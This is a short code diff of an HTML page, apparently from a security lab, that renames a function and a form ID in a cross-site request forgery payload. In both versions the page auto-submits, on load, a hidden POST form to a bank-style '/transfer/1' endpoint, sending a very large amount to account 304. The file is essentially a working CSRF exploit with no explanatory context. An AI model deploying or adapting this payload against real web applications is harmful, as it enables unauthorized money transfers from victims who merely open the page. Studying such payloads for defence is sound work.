@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
-  <body onload="submitForm()">
-    <form id="ctForm" action="http://svb:5003/transfer/1" method="POST">
+  <body onload="SubmitForm()">
+    <form id="CustomForm" action="http://svb:5003/transfer/1" method="POST">
       <input type="hidden" name="account" value="304">
       <input type="hidden" name="amount" value="1000100100010">
     </form>
     <script>
-      function submitForm() {
-        document.getElementById("ctForm").submit();
+      function SubmitForm() {
+        document.getElementById("CustomForm").submit();
       }
     </script>
   </body>
